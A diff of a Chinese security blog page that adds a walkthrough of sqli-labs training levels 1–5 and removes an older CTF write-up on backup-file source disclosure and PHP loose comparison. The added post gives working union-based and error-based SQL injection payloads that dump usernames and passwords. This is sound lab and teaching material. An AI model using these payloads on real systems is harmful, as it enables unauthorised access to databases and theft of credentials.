@@ -169,6 +169,167 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-bachang" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/02/01/bachang/" class="article-date">
+  	<time datetime="2021-02-01T06:24:18.000Z" itemprop="datePublished">2021-02-01</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/01/bachang/">
+        sqlilabs靶场1-5
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1>知识点</h1>
+
+<p>查数据库名：select database()<br>information_schema.tables：存储mysql数据库下面的所有表名信息的表<br>table_schema：数据库名<br>table_name：表名<br>column_name：列名<br>information_schema.columns ：存储mysql数据库下面的所有列名信息的表<br>table_name：表名<br>–+：表示注释，目的是把字符数据的后一个单引号及后面的语句注释掉，以免影响<br>group_concat函数：它将相同行的指定列的数据连在一起，如果不用该函数，只能显示一个数据，满足不了我们的需求，所以用group_concat函数将所有数据显示</p>
+<h1>Less-1</h1>
+<h4>界面：</h4>
+
+<p><img src="/2021/02/01/bachang/oh0.png"></p>
+<h4>测试：</h4>
+
+<p><b style="color:red">1、</b> url + ?id=1<br><img src="/2021/02/01/bachang/oh1.png"><br>回显正常，说明不是数字型注入<br><b style="color:red">2、</b> url + ?id=1’<br><img src="/2021/02/01/bachang/oh2.png"><br>回显报错，说明是字符型注入<br><b style="color:red">3、</b> url + ?id=1’ or ‘1’=’1<br><img src="/2021/02/01/bachang/oh3.png"><br>回显正常，单引号闭合成功，通过单引号闭合进行注入<br><b style="color:red">4、</b>进行测试：</p>
+<ul>
+<li>url + ?id=1' order by 3--+ 
+<br>//回显正常
+</li><li>url + ?id=1' order by 4--+
+<br>//报错："Unknown column '4' in 'order clause'"
+</li></ul>
+
+<p><img src="/2021/02/01/bachang/oh4.png"><br>通过逐个测试，得出字段数为3，进行联合注入<br><b style="color:red">5、</b>查看回显的字段：<br>url + ?id=-1’ union select 1,2,3 –+<br>//得到可以回显的字段：2,3字段<br><img src="/2021/02/01/bachang/oh5.png"><br>url + ?id=-1’ union select 1,database(),3 –+<br>//得到字段2所对应的数据库名为security<br><img src="/2021/02/01/bachang/oh6.png"><br><b style="color:red">6、</b>查看所有数据库名：<br>url + ?id=-1’ union select 1,<br>(select group_concat(schema_name) from information_schema.schemata),3 –+<br><img src="/2021/02/01/bachang/oh7.png"><br><b style="color:red">7、</b>查看security库内的所有表名：<br>url + ?id=-1’ union select 1,<br>(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3 –+<br><img src="/2021/02/01/bachang/oh8.png"><br><b style="color:red">8、</b>爆出users表中的列名：<br>url + ?id=-1’ union select 1,<br>(select group_concat(column_name) from information_schema.columns where table_name=’users’),3 –+<br><img src="/2021/02/01/bachang/oh9.png"><br>有用户名和密码<br><b style="color:red">9、</b>爆破用户名和密码：<br>url + ?id=-1’ union select 1,<br>(select group_concat(password) from security.users),(select group_concat(username) from security.users) –+<br><img src="/2021/02/01/bachang/oh10.png"><br>得到所有的用户名和密码</p>
+<h1>Less-2</h1>
+
+<h4>界面：</h4>
+
+<p><img src="/2021/02/01/bachang/eee1.png"><br>进行测试，结果如下：<br><img src="/2021/02/01/bachang/eee2.png"><br>发现属于数字型注入，不需要进行闭合，直接进行注入<br>同Less-1一样，通过构造?id=-1 order by 1/2/3/4来得出字段数为3<br>构造?id=1 and 1=2 union select 1,2,3 或者 ?id=-1 union select 1,2,3来判断回显字段：<br><img src="/2021/02/01/bachang/eee3.png"><br>回显字段和Less-1一样是2和3<br>//其他步骤同Less-1类似，只是id=-1后没有加’</p>
+<h4>最终payload：</h4>
+
+<p>?id=-1 union select 1,<br>(select group_concat(password) from security.users),(select group_concat(username) from security.users) –+<br><img src="/2021/02/01/bachang/eee4.png"><br>得到所有用户名和密码</p>
+<h1>Less-3</h1>
+<h4>界面</h4>
+
+<p><img src="/2021/02/01/bachang/a0.png"></p>
+<h4>测试：</h4>
+
+<p>单引号与括号闭合</p>
+<ul>
+<li>url + ?id=1
+//回显正常
+</li><li>url + ?id=1'
+//You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1
+</li><li>url + ?id=1') --+
+//回显正常
+</li></ul>
+
+<p>构造?id=1’) order by 1/2/3/4–+ 获得字段数3<br><img src="/2021/02/01/bachang/a1.png"><br>构造：?id=-1) union select 1,2,3–+<br><img src="/2021/02/01/bachang/a2.png"><br>回显字段依然是2和3<br>其余步骤依然与Less-1类似，只需将id=1’改成id=-1’)</p>
+<h4>最终payload：</h4>
+
+<p>?id=-1’) union select 1,<br>(select group_concat(password) from security.users),(select group_concat(username) from security.users)–+<br><img src="/2021/02/01/bachang/a3.png"><br>得到所有用户名和密码！</p>
+<h1>Less-4</h1>
+<h4>界面</h4>
+
+<p><img src="/2021/02/01/bachang/b1.png"></p>
+<h4>测试：</h4>
+
+<p>先提交1，成功回显，在提交1’,回显成功，提交1’’,报错<br><img src="/2021/02/01/bachang/b2.png"><br>双引号和括号闭合</p>
+<ul>
+<li>url + ?id=1") --+
+//闭合成功
+</li><li>url + ?id=1") order by 1/2/3/4--+
+//得到字段数3
+</li><li>url + ?id=-1") union select 1,2,3--+</li>
+<img src="/2021/02/01/bachang/b3.png">
+<br>//进行联合注入,得到回显字段
+</ul>
+
+<p>其余步骤依然与Less-1类似，只需将id=1’改成id=-1”)</p>
+<h4>最终payload</h4>
+
+<p>url + ?id=-1’) union select 1,<br>(select group_concat(password) from security.users),(select group_concat(username) from security.users)–+<br><img src="/2021/02/01/bachang/b4.png"><br>得到所有用户名和密码~</p>
+<h1>Less-5</h1>
+<h4>界面：</h4>
+
+<p><img src="/2021/02/01/bachang/q1.png"></p>
+<h4>测试：</h4>
+
+<p><b style="color:blue">###1、</b>逐个测试</p>
+<ul>
+<li>?id=1
+//回显：You are in..........
+</li><li>?id=1'
+//回显：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
+</li></ul>
+
+<p>构造：?id=1’ order by 3–+ 来确认字段数量<br><b style="color:blue">###2、</b>获取数据库名<br>法一：通过updatexml报错注入：</p>
+<ul>
+<li>?id=1' and 1=(updatexml(1,concat(0x3a,(select database())),1))%23
+</li></ul>
+法二：通过floor报错注入：
+<ul>
+<li>?id=1' union select count(*),0,concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a limit 0,10 --+
+</li></ul>
+
+<p>可以知道数据库名为：security<br><img src="/2021/02/01/bachang/q2.png"><br><b style="color:blue">###3、</b>获取security数据库的表名</p>
+<ul>
+<li>?id=1' and updatexml('~',concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),'~')--+
+</li></ul>
+
+<p><img src="/2021/02/01/bachang/q3.png"><br><b style="color:blue">###4、</b>查询users表内的字段名</p>
+<ul>
+<li>?id=1' and extractvalue(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,32)))--+
+</li></ul>
+
+<p><img src="/2021/02/01/bachang/q4.png"></p>
+<p><b style="color:blue">###5、</b>查询users表内的字段数据</p>
+<ul>
+<li>?id=1' and extractvalue(1,concat(0x7e,substring((select group_concat(username,0x3a,password) from users),1,32)))--+
+</li></ul>
+
+<p><img src="/2021/02/01/bachang/q5.png"><br>啊~好累的一天<br><img src="/2021/02/01/bachang/bbb.png"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-baby" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1052,82 +1213,9 @@
 
 
   
-    <article id="post-bak" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/01/22/bak/" class="article-date">
-  	<time datetime="2021-01-22T08:41:25.000Z" itemprop="datePublished">2021-01-22</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/22/bak/">
-        8-buu练习[ACTF2020 新生赛]BackupFile
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>打开题目地址，如下：<br><img src="/2021/01/22/bak/bak1.png"></p>
-<ul>
-<li>f12查看源代码，代码不在里面。
-</li><li>尝试了robots.txt，也没有
-</li><li>猜测www.zip、.tar.gz、rar，但依然没有
-</li><li>最后灵机一动查看index.php.bak，代码竟真的现在这里
-</li></ul>
-
-<p>代码如下：<br><img src="/2021/01/22/bak/bak2.png"><br>get传入key，与一串开头为123的字符串比较，【==】 为弱比较，直接令<b>key=123</b>，如下：<br><img src="/2021/01/22/bak/bak3.png"><br>bujiu~得到flag！</p>
-<h2>知识点总结：</h2>
-<h3>“==”和“===”:</h3>
-
-<p>PHP中有两种比较符号，“==”与“===”。“==”我们称之为等值符，当等号两边为相同类型时，直接比较值是否相等；当等号两边类型不同时，先转换为相同的类型，再对转换后的值进行比较，如果比较一个数字和字符串或者涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照常数值进行比较。</p>
-<h3>ctf题得到源码的方法：</h3>
-<li>1.请求头或者响应头中有一些类似showsource:0的部分，改成showsource:1即可.
-</li><li>2.一些缓存或者备份文件,.bak  .swo  .swp  .backup  .txt
-</li><li>3.一些文件下载漏洞，直接修改文件下载路径即可下载任意文件源码
-</li><li>4.用php://filter得到源码   谈一谈php://filter的妙用   php://filter技术分享
-</li><li>5.目录遍历漏洞
-</li>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
     </nav>
   
 </div>
